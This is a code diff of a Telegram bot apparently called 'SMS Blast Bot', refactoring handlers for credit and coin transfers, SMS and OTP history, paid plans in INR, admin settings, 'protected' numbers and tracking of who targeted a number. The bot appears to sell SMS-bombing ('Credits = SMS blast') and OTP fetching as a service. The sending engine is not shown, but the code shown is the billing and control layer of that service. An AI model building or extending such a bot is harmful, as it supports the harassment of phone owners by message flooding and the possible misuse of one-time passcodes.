-            [btn("back", "user:home", EMOJI_GEAR, "🔙")]
-        ]))
+            [btn("back", "user:home", EMOJI_GEAR, "🔙")]]))
 
 @R.callback_query(F.data == "user:transfer:credits")
-async def transfer_credits_start(cq: CallbackQuery, state: FSMContext):
+async def transfer_credits_start(cq, state):
     d = load(); uid = cq.from_user.id
     if is_banned(uid, d):
         try: await cq.answer("⛔")
@@ -3698,57 +3691,53 @@ async def transfer_credits_start(cq: CallbackQuery, state: FSMContext):
         return
     cur = get_user_credits(uid, d)
     if cur < 2:
-        try: await cq.answer("❌ Min 2 credits!")
+        try: await cq.answer("❌ Min 2!")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.transfer_credits_uid)
-    await safe_edit(cq,
-        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\nYour Credits: <b>{cur}</b>\n"
-        f"Half transfer allowed.\n\nStep 1/2: Target ID:",
-        kb([(f"{sc('cancel')}", "user:transfer:menu")]))
+    await safe_edit(cq, f"💸 <b>Transfer Credits</b>\n\nYour: <b>{cur}</b>\nMax: half\n\nStep 1/2: Target ID:",
+                    kb([(f"{sc('cancel')}", "user:transfer:menu")]))
 
 @R.message(S.transfer_credits_uid)
-async def transfer_credits_uid(m: Message, state: FSMContext):
+async def transfer_credits_uid(m, state):
     d = load(); uid = m.from_user.id
     try: t = int((m.text or "").strip())
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid ID.", parse_mode="HTML"); return
     if t == uid:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Self!", parse_mode="HTML"); return
+        await m.answer(f"❌ Self!", parse_mode="HTML"); return
     if str(t) not in d.get("users", {}):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found!", parse_mode="HTML"); return
+        await m.answer(f"❌ Not found!", parse_mode="HTML"); return
     cur = get_user_credits(uid, d)
     if cur < 2:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Min 2!", parse_mode="HTML"); return
+        await m.answer(f"❌ Min 2!", parse_mode="HTML"); return
     await state.update_data(transfer_target=t)
     await state.set_state(S.transfer_credits_amount)
-    half = cur // 2
-    await m.answer(f"Step 2/2\nTo: <code>{t}</code>\nMax: <b>{half}</b>\n\nAmount:")
+    await m.answer(f"Step 2/2\nTo: <code>{t}</code>\nMax: <b>{cur // 2}</b>\n\nAmount:")
 
 @R.message(S.transfer_credits_amount)
-async def transfer_credits_amt(m: Message, state: FSMContext):
+async def transfer_credits_amt(m, state):
     d = load(); uid = m.from_user.id
     try:
         a = int((m.text or "").strip())
         if a <= 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     fsmd = await state.get_data(); t = fsmd.get("transfer_target")
     cur = get_user_credits(uid, d); mt = cur // 2
     if a > mt:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {mt}!", parse_mode="HTML"); return
+        await m.answer(f"❌ Max {mt}!", parse_mode="HTML"); return
     if not deduct_credits(uid, a, d):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML"); return
+        await m.answer(f"❌ Insufficient.", parse_mode="HTML"); return
     add_credits(t, a, d, is_manual=False); save(); await state.clear()
-    try: await m.bot.send_message(t, f"{em(EMOJI_MONEY, '💸')} <b>+{a} credits from {uid}</b>", parse_mode="HTML")
+    try: await m.bot.send_message(t, f"💸 <b>+{a} credits from {uid}</b>", parse_mode="HTML")
     except Exception: pass
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Sent {a} credits to <code>{t}</code>.",
-                   reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
+    await m.answer(f"✅ Sent {a} to <code>{t}</code>.", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
 
 @R.callback_query(F.data == "user:transfer:coins")
-async def transfer_coins_start(cq: CallbackQuery, state: FSMContext):
+async def transfer_coins_start(cq, state):
     d = load(); uid = cq.from_user.id
     if is_banned(uid, d):
         try: await cq.answer("⛔")
@@ -3756,76 +3745,72 @@ async def transfer_coins_start(cq: CallbackQuery, state: FSMContext):
         return
     cur = get_user_coins(uid, d)
     if cur < 1:
-        try: await cq.answer("❌ Min 1 coin!")
+        try: await cq.answer("❌ Min 1!")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.transfer_coins_uid)
-    await safe_edit(cq,
-        f"{em(EMOJI_COIN, '🪙')} <b>Transfer Coins</b>\n\nYour Coins: <b>{cur}</b>\n\nStep 1/2: Target ID:",
-        kb([(f"{sc('cancel')}", "user:transfer:menu")]))
+    await safe_edit(cq, f"🪙 <b>Transfer Coins</b>\n\nYour: <b>{cur}</b>\n\nStep 1/2: Target ID:",
+                    kb([(f"{sc('cancel')}", "user:transfer:menu")]))
 
 @R.message(S.transfer_coins_uid)
-async def transfer_coins_uid(m: Message, state: FSMContext):
+async def transfer_coins_uid(m, state):
     d = load(); uid = m.from_user.id
     try: t = int((m.text or "").strip())
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid ID.", parse_mode="HTML"); return
     if t == uid:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Self!", parse_mode="HTML"); return
+        await m.answer(f"❌ Self!", parse_mode="HTML"); return
     if str(t) not in d.get("users", {}):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found!", parse_mode="HTML"); return
+        await m.answer(f"❌ Not found!", parse_mode="HTML"); return
     await state.update_data(transfer_target=t)
     await state.set_state(S.transfer_coins_amount)
     await m.answer(f"Step 2/2\nTo: <code>{t}</code>\n\nAmount:")
 
 @R.message(S.transfer_coins_amount)
-async def transfer_coins_amt(m: Message, state: FSMContext):
+async def transfer_coins_amt(m, state):
     d = load(); uid = m.from_user.id
     try:
         a = int((m.text or "").strip())
         if a <= 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     fsmd = await state.get_data(); t = fsmd.get("transfer_target")
     cur = get_user_coins(uid, d)
     if a > cur:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Max {cur}!", parse_mode="HTML"); return
+        await m.answer(f"❌ Max {cur}!", parse_mode="HTML"); return
     if not deduct_coins(uid, a, d):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient.", parse_mode="HTML"); return
+        await m.answer(f"❌ Insufficient.", parse_mode="HTML"); return
     add_coins(t, a, d, is_manual=False); save(); await state.clear()
-    try: await m.bot.send_message(t, f"{em(EMOJI_COIN, '🪙')} <b>+{a} coins from {uid}</b>", parse_mode="HTML")
+    try: await m.bot.send_message(t, f"🪙 <b>+{a} coins from {uid}</b>", parse_mode="HTML")
     except Exception: pass
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Sent {a} coins to <code>{t}</code>.",
-                   reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
+    await m.answer(f"✅ Sent {a} coins to <code>{t}</code>.", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
 
-# ----- USER STATS -----
+# ----- USER STATS/HISTORY -----
 @R.callback_query(F.data == "user:stats")
-async def user_stats(cq: CallbackQuery, state: FSMContext):
+async def user_stats(cq, state):
     d = load(); uid = cq.from_user.id
     try: await cq.answer()
     except Exception: pass
     ud = d["users"].get(str(uid), {})
     await safe_edit(cq,
-        f"{em(EMOJI_CHART, '📊')} <b>Your Stats</b>\n\n"
-        f"💰 Credits: <b>{ud.get('credits', 0)}</b>\n"
-        f"🪙 Coins: <b>{ud.get('coins', 0)}</b>\n"
-        f"📤 SMS Sent: <b>{ud.get('uses', 0)}</b>\n"
+        f"📊 <b>Your Stats</b>\n\n💰 Credits: <b>{ud.get('credits', 0)}</b>\n"
+        f"🪙 Coins: <b>{ud.get('coins', 0)}</b>\n📤 SMS Sent: <b>{ud.get('uses', 0)}</b>\n"
         f"🔐 OTP Fetched: <b>{ud.get('otp_uses', 0)}</b>\n"
         f"📅 Joined: <b>{fmt_time(ud.get('joined_at', 0))}</b>",
         kb([(f"{sc('back')}", "user:home")]))
 
 @R.callback_query(F.data == "user:sms_history")
-async def user_sms_hist_self(cq: CallbackQuery, state: FSMContext):
+async def user_sms_hist_self(cq, state):
     d = load(); uid = cq.from_user.id
     try: await cq.answer()
     except Exception: pass
     h = d.get("sms_history", {}).get(str(uid), [])[-10:]
     if not h:
-        txt = f"{em(EMOJI_CLOCK, '📜')} <b>History</b>\n\nEmpty."
+        txt = f"📜 <b>History</b>\n\nEmpty."
     else:
-        lines = [f"{em(EMOJI_CLOCK, '📜')} <b>Your History</b>\n"]
+        lines = [f"📜 <b>Your History</b>\n"]
         for i, e in enumerate(reversed(h), 1):
             ts = fmt_time(e.get("timestamp", 0)); nm = e.get("number", "?")
             mp = esc(str(e.get("message", ""))[:30]); st = e.get("status", "?")
@@ -3835,25 +3820,24 @@ async def user_sms_hist_self(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, kb([(f"{sc('back')}", "user:home")]))
 
 @R.callback_query(F.data == "user:otp_history")
-async def user_otp_hist_self(cq: CallbackQuery, state: FSMContext):
+async def user_otp_hist_self(cq, state):
     d = load(); uid = cq.from_user.id
     try: await cq.answer()
     except Exception: pass
     h = d.get("otp_history", {}).get(str(uid), [])[-20:]
     if not h:
-        txt = f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b>\n\nEmpty."
+        txt = f"🔐 <b>OTP History</b>\n\nEmpty."
     else:
-        lines = [f"{em(EMOJI_OTP, '🔐')} <b>Your OTPs</b>\n"]
+        lines = [f"🔐 <b>Your OTPs</b>\n"]
         for i, e in enumerate(reversed(h), 1):
-            ts = fmt_time(e.get("timestamp", 0))
-            otp = e.get("otp", "?")
+            ts = fmt_time(e.get("timestamp", 0)); otp = e.get("otp", "?")
             sender = esc(str(e.get("sender", "?"))[:20])
             lines.append(f"{i}. 🔐 <b>{otp}</b> — {sender} [{ts}]")
         txt = "\n".join(lines)
     await safe_edit(cq, txt, kb([(f"{sc('back')}", "user:home")]))
 
 @R.callback_query(F.data == "user:pricing")
-async def user_pricing(cq: CallbackQuery, state: FSMContext):
+async def user_pricing(cq, state):
     d = load(); plans = d.get("pricing", {}).get("plans", [])
     if not plans:
         try: await cq.answer("❌ No plans!")
@@ -3861,12 +3845,12 @@ async def user_pricing(cq: CallbackQuery, state: FSMContext):
         return
     try: await cq.answer()
     except Exception: pass
-    txt = f"{em(EMOJI_MONEY, '💰')} <b>Buy</b>\n\n"
+    txt = f"💰 <b>Buy</b>\n\n"
     for p in plans:
         cur = p.get("currency", "credits")
         amt = p.get("credits", 0) if cur == "credits" else p.get("coins", 0)
         ic = "💰" if cur == "credits" else "🪙"
-        txt += f"{em(EMOJI_STAR, '📋')} <b>{esc(p['name'])}</b>\n   {p['price']} INR = {amt} {ic}\n\n"
+        txt += f"📋 <b>{esc(p['name'])}</b>\n   {p['price']} INR = {amt} {ic}\n\n"
     rows = []
     for p in plans:
         rows.append([btn_url(f"Buy {p['name'][:20]}", p['payment_link'], EMOJI_MONEY, "💳", style="success")])
@@ -3874,50 +3858,48 @@ async def user_pricing(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "user:info")
-async def user_info(cq: CallbackQuery, state: FSMContext):
+async def user_info(cq, state):
     d = load()
     try: await cq.answer()
     except Exception: pass
     od = get_owner_display(d)
-    ol = f"{em(EMOJI_CROWN, '👤')} Owner: <a href='{SUPER_ADMIN_LINK}'>{esc(od)}</a>\n" if od else ""
+    ol = f"👤 Owner: <a href='{SUPER_ADMIN_LINK}'>{esc(od)}</a>\n" if od else ""
     await safe_edit(cq,
-        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n{ol}\n"
+        f"ℹ️ <b>SMS Blast Bot {_VERSION}</b>\n\n{ol}\n"
         f"💰 Credits = SMS blast\n🪙 Coins = Get OTP\n\n<i>Referral se free!</i>",
         kb([(f"{sc('back')}", "user:home")]))
 
 @R.callback_query(F.data == "noop")
-async def noop(cq: CallbackQuery):
+async def noop(cq):
     try: await cq.answer()
     except Exception: pass
 
 # ----- VIDEOS -----
 @R.callback_query(F.data == "owner:videos:menu")
-async def vids_menu(cq: CallbackQuery, state: FSMContext):
+async def vids_menu(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    await safe_edit(cq, f"{em(EMOJI_VIDEO, '📹')} <b>Videos</b>\n\nTotal: <b>{len(d.get('videos', []))}</b>",
-                    videos_menu_kb(d))
+    await safe_edit(cq, f"📹 <b>Videos</b>\n\nTotal: <b>{len(d.get('videos', []))}</b>", videos_menu_kb(d))
 
 @R.callback_query(F.data == "owner:videos:add")
-async def vids_add_start(cq: CallbackQuery, state: FSMContext):
+async def vids_add_start(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.add_video)
-    await safe_edit(cq, f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nSend video/URL:",
-                    kb([(f"{sc('cancel')}", "owner:videos:menu")]))
+    await safe_edit(cq, f"📹 <b>Add Video</b>\n\nSend video/URL:", kb([(f"{sc('cancel')}", "owner:videos:menu")]))
 
 @R.message(S.add_video)
-async def vids_add_done(m: Message, state: FSMContext):
+async def vids_add_done(m, state):
     d = load()
     if not is_admin(m.from_user.id, d):
         await state.clear(); return
@@ -3926,15 +3908,15 @@ async def vids_add_done(m: Message, state: FSMContext):
     elif m.document and m.document.mime_type and m.document.mime_type.startswith("video"): vid = m.document.file_id
     elif m.text: vid = m.text.strip()
     if not vid:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid video.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid video.", parse_mode="HTML"); return
     d.setdefault("videos", []).append(vid); save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Saved!", reply_markup=videos_menu_kb(load()), parse_mode="HTML")
+    await m.answer(f"✅ Saved!", reply_markup=videos_menu_kb(load()), parse_mode="HTML")
 
 @R.callback_query(F.data.startswith("owner:videos:del:"))
-async def vids_del(cq: CallbackQuery, state: FSMContext):
+async def vids_del(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: idx = int(cq.data.split("owner:videos:del:", 1)[1])
@@ -3950,10 +3932,10 @@ async def vids_del(cq: CallbackQuery, state: FSMContext):
     await vids_menu(cq, state)
 
 @R.callback_query(F.data == "owner:videos:bulk_del")
-async def vids_bulk_del(cq: CallbackQuery, state: FSMContext):
+async def vids_bulk_del(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     d["videos"] = []; save()
@@ -3962,7 +3944,7 @@ async def vids_bulk_del(cq: CallbackQuery, state: FSMContext):
     await vids_menu(cq, state)
 
 @R.callback_query(F.data == "user:random_video")
-async def user_vid(cq: CallbackQuery, state: FSMContext):
+async def user_vid(cq, state):
     d = load(); vids = d.get("videos", [])
     if not vids:
         try: await cq.answer("❌ No videos!")
@@ -3970,22 +3952,21 @@ async def user_vid(cq: CallbackQuery, state: FSMContext):
         return
     try: await cq.answer("📹 Sending...")
     except Exception: pass
-    await send_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")
+    await send_video(cq.bot, cq.message.chat.id, caption=f"📹 Enjoy!")
 
 # ----- SETTINGS -----
 @R.callback_query(F.data == "owner:settings")
-async def settings_menu(cq: CallbackQuery, state: FSMContext):
+async def settings_menu(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     s = d.get("settings", {})
     od = get_owner_display(d) or "<i>(hidden)</i>"
-    txt = (f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
-           f"👤 Owner: <b>{od}</b>\n"
+    txt = (f"⚙️ <b>Settings</b>\n\n👤 Owner: <b>{od}</b>\n"
            f"🎁 Ref Credits: <b>{s.get('ref_credits', 3)}</b>\n"
            f"🪙 Ref Coins: <b>{s.get('ref_coins', 1)}</b>\n"
            f"🔐 OTP Cost: <b>{s.get('otp_cost', 1)}</b> coins")
@@ -3999,20 +3980,19 @@ async def settings_menu(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:settings:ref")
-async def settings_ref(cq: CallbackQuery, state: FSMContext):
+async def settings_ref(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.set_ref_credits)
-    await safe_edit(cq, f"{em(EMOJI_GIFT, '🎁')} <b>Ref Credits</b>\n\nAmount:",
-                    kb([(f"{sc('cancel')}", "owner:settings")]))
+    await safe_edit(cq, f"🎁 <b>Ref Credits</b>\n\nAmount:", kb([(f"{sc('cancel')}", "owner:settings")]))
 
 @R.message(S.set_ref_credits)
-async def settings_ref_done(m: Message, state: FSMContext):
+async def settings_ref_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -4020,26 +4000,24 @@ async def settings_ref_done(m: Message, state: FSMContext):
         c = int((m.text or "").strip())
         if c < 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     d.setdefault("settings", {})["ref_credits"] = c; save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Ref credits: {c}",
-                   reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")
+    await m.answer(f"✅ Ref credits: {c}", reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:settings:refcoin")
-async def settings_refcoin(cq: CallbackQuery, state: FSMContext):
+async def settings_refcoin(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.set_ref_coins)
-    await safe_edit(cq, f"{em(EMOJI_COIN, '🪙')} <b>Ref Coins</b>\n\nAmount:",
-                    kb([(f"{sc('cancel')}", "owner:settings")]))
+    await safe_edit(cq, f"🪙 <b>Ref Coins</b>\n\nAmount:", kb([(f"{sc('cancel')}", "owner:settings")]))
 
 @R.message(S.set_ref_coins)
-async def settings_refcoin_done(m: Message, state: FSMContext):
+async def settings_refcoin_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -4047,26 +4025,24 @@ async def settings_refcoin_done(m: Message, state: FSMContext):
         c = int((m.text or "").strip())
         if c < 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     d.setdefault("settings", {})["ref_coins"] = c; save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Ref coins: {c}",
-                   reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")
+    await m.answer(f"✅ Ref coins: {c}", reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:settings:otpcost")
-async def settings_otpcost(cq: CallbackQuery, state: FSMContext):
+async def settings_otpcost(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.set_otp_cost)
-    await safe_edit(cq, f"{em(EMOJI_OTP, '🔐')} <b>OTP Cost</b>\n\nCoins per fetch:",
-                    kb([(f"{sc('cancel')}", "owner:settings")]))
+    await safe_edit(cq, f"🔐 <b>OTP Cost</b>\n\nCoins per fetch:", kb([(f"{sc('cancel')}", "owner:settings")]))
 
 @R.message(S.set_otp_cost)
-async def settings_otpcost_done(m: Message, state: FSMContext):
+async def settings_otpcost_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -4074,16 +4050,15 @@ async def settings_otpcost_done(m: Message, state: FSMContext):
         c = int((m.text or "").strip())
         if c < 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     d.setdefault("settings", {})["otp_cost"] = c; save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} OTP cost: {c} coins",
-                   reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")
+    await m.answer(f"✅ OTP cost: {c}", reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:coin_ledger")
-async def owner_coin_ledger(cq: CallbackQuery, state: FSMContext):
+async def owner_coin_ledger(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -4093,75 +4068,70 @@ async def owner_coin_ledger(cq: CallbackQuery, state: FSMContext):
     total_credits = sum(int(u.get("credits", 0)) for u in users.values())
     otp_total = sum(len(v) for v in d.get("otp_history", {}).values())
     await safe_edit(cq,
-        f"{em(EMOJI_COIN, '🪙')} <b>Coin Ledger</b>\n\n"
-        f"💰 Total Credits: <b>{total_credits}</b>\n"
-        f"🪙 Total Coins: <b>{total_coins}</b>\n"
-        f"🔐 OTP Fetches: <b>{otp_total}</b>\n"
+        f"🪙 <b>Coin Ledger</b>\n\n💰 Total Credits: <b>{total_credits}</b>\n"
+        f"🪙 Total Coins: <b>{total_coins}</b>\n🔐 OTP Fetches: <b>{otp_total}</b>\n"
         f"🔐 Cost: <b>{get_otp_cost(d)}</b> coins/use",
         kb([(f"{sc('back')}", "owner:home")]))
 
-# ----- PROTECTED / TRACK -----
+# ----- PROTECTED -----
 @R.callback_query(F.data == "owner:protect")
-async def protect_start(cq: CallbackQuery, state: FSMContext):
+async def protect_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.protect_number)
-    await safe_edit(cq, f"{em(EMOJI_LOCK, '🔒')} <b>Protect</b>\n\nNumber:",
-                    kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"🔒 <b>Protect</b>\n\nNumber:", kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.protect_number)
-async def protect_done(m: Message, state: FSMContext):
+async def protect_done(m, state):
     d = load(); uid = m.from_user.id
     if not is_owner(uid, d):
         await state.clear(); return
     num = (m.text or "").strip()
     cl = num.replace("+", "").replace(" ", "").replace("-", "")
     if not cl.isdigit() or len(cl) < 7:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Invalid.", parse_mode="HTML"); return
     PROTECTED_NUMBERS[num] = uid
     d["protected_numbers"] = PROTECTED_NUMBERS; save(); await state.clear()
-    await m.answer(f"{em(EMOJI_LOCK, '🔒')} Protected: <code>{esc(num)}</code>",
+    await m.answer(f"🔒 Protected: <code>{esc(num)}</code>",
                    reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:protected_list")
-async def protected_list(cq: CallbackQuery, state: FSMContext):
+async def protected_list(cq, state):
     d = load(); uid = cq.from_user.id
     if not is_owner(uid, d) and not is_admin(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     pr = d.get("protected_numbers", {})
     if not pr:
-        await safe_edit(cq, f"{em(EMOJI_LOCK, '🔐')} <b>Protected</b>\n\n❌ None.",
-                        kb([(f"{sc('back')}", "owner:home")]))
+        await safe_edit(cq, f"🔐 <b>Protected</b>\n\n❌ None.", kb([(f"{sc('back')}", "owner:home")]))
         return
-    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected</b>\n"]
+    lines = [f"🔐 <b>Protected</b>\n"]
     for num, pu in pr.items():
         lines.append(f"📞 <code>{esc(num)}</code> — <code>{pu}</code>")
     await safe_edit(cq, "\n".join(lines), kb([(f"{sc('back')}", "owner:home")]))
 
 @R.callback_query(F.data == "owner:track")
-async def track_start(cq: CallbackQuery, state: FSMContext):
+async def track_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.track_number)
-    await safe_edit(cq, f"{em(EMOJI_STAR, '📊')} <b>Track</b>\n\nNumber:",
-                    kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"📊 <b>Track</b>\n\nNumber:", kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.track_number)
-async def track_done(m: Message, state: FSMContext):
+async def track_done(m, state):
     d = load(); uid = m.from_user.id
     if not is_owner(uid, d):
         await state.clear(); return
@@ -4175,66 +4145,64 @@ async def track_done(m: Message, state: FSMContext):
                 who.append({"uid": int(us), "name": ud.get("name", "?"), "ts": e.get("timestamp", 0)})
                 break
     if not who:
-        await m.answer(f"{em(EMOJI_STAR, '📊')} Track\n\n<code>{esc(num)}</code>\n\n❌ None.",
+        await m.answer(f"📊 Track\n\n<code>{esc(num)}</code>\n\n❌ None.",
                        reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
-    lines = [f"{em(EMOJI_STAR, '📊')} <b>{esc(num)}</b>\n"]
+    lines = [f"📊 <b>{esc(num)}</b>\n"]
     for e in who[:50]:
         lines.append(f"• <code>{e['uid']}</code> — {esc(str(e['name'])[:20])} — {fmt_time(e['ts'])}")
     await m.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
 
-# ----- ACTIVITY -----
 @R.callback_query(F.data == "owner:activity")
-async def activity(cq: CallbackQuery, state: FSMContext):
+async def activity(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     ent = d.get("activity_log", [])[-20:]
     if not ent:
-        txt = f"{em(EMOJI_GEAR, '📜')} <b>Activity</b>\n\nEmpty."
+        txt = f"📜 <b>Activity</b>\n\nEmpty."
     else:
-        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent</b>\n"]
+        lines = [f"📜 <b>Recent</b>\n"]
         for e in reversed(ent):
             ts = fmt_time(e.get("timestamp", 0))
             lines.append(f"[{ts}] <code>{e.get('uid', 0)}</code> {e.get('action', '?')} — {esc(str(e.get('details', ''))[:60])}")
         txt = "\n".join(lines)
-    await safe_edit(cq, txt,
-        kb([(f"{sc('refresh')}", "owner:activity"), (f"{sc('back')}", "owner:home")]))
+    await safe_edit(cq, txt, kb([(f"{sc('refresh')}", "owner:activity"), (f"{sc('back')}", "owner:home")]))
 
 @R.callback_query(F.data == "owner:sms_history")
-async def sms_hist(cq: CallbackQuery, state: FSMContext):
+async def sms_hist(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     allh = d.get("sms_history", {}); tot = sum(len(v) for v in allh.values())
-    await safe_edit(cq, f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal: <b>{tot}</b>",
+    await safe_edit(cq, f"📋 <b>Global SMS History</b>\n\nTotal: <b>{tot}</b>",
                     kb([(f"{sc('back')}", "owner:home")]))
 
 @R.callback_query(F.data == "owner:otp_history")
-async def otp_hist_owner(cq: CallbackQuery, state: FSMContext):
+async def otp_hist_owner(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     allh = d.get("otp_history", {}); tot = sum(len(v) for v in allh.values())
-    await safe_edit(cq, f"{em(EMOJI_OTP, '🔐')} <b>Global OTP History</b>\n\nTotal: <b>{tot}</b>",
+    await safe_edit(cq, f"🔐 <b>Global OTP History</b>\n\nTotal: <b>{tot}</b>",
